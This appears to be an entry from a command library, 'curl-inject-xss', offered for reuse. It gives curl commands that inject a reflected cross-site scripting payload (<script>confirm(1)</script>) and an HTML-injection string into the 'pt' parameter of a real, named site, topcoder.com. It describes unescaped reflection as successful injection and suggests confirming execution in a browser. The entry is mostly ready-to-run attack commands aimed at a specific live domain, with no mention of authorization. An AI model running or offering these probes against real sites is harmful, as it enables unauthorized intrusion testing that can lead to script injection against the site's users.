---
id: cmd-789652-inject-xss
data: >-
  curl
  "https://www.topcoder.com/tc?module=ReviewBoard&pt=<script>confirm(1)</script>"
  -s
tags:
  - xss
  - injection
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:36.879Z'
verified: false
validated: true
submitted: true
---
# curl-inject-xss

## Command

```bash
curl "https://www.topcoder.com/tc?module=ReviewBoard&pt=<script>confirm(1)</script>" -s
```

## Description

This command sends a curl request with an XSS payload in the 'pt' parameter to test for reflection and potential execution. While curl won't execute JS, it checks server response for payload presence; follow up with browser testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL with payload | Endpoint including <script>confirm(1)</script> in pt | Yes |
| -s | Silent mode | No |

## Examples

### Basic Usage

```bash
curl "https://www.topcoder.com/tc?module=ReviewBoard&pt=<script>confirm(1)</script>" -s
```

### Advanced Usage

```bash
curl "https://www.topcoder.com/tc?module=ReviewBoard&pt=\"><h1>TEST</h1>" -s | grep h1
```

## Expected Output

HTML response containing the injected payload unescaped, e.g., '<script>confirm(1)</script>' in the body, signaling successful injection (verify execution in browser).

## Related

- [[Related Procedure: Inject-XSS-Payload-into-pt-Parameter]]
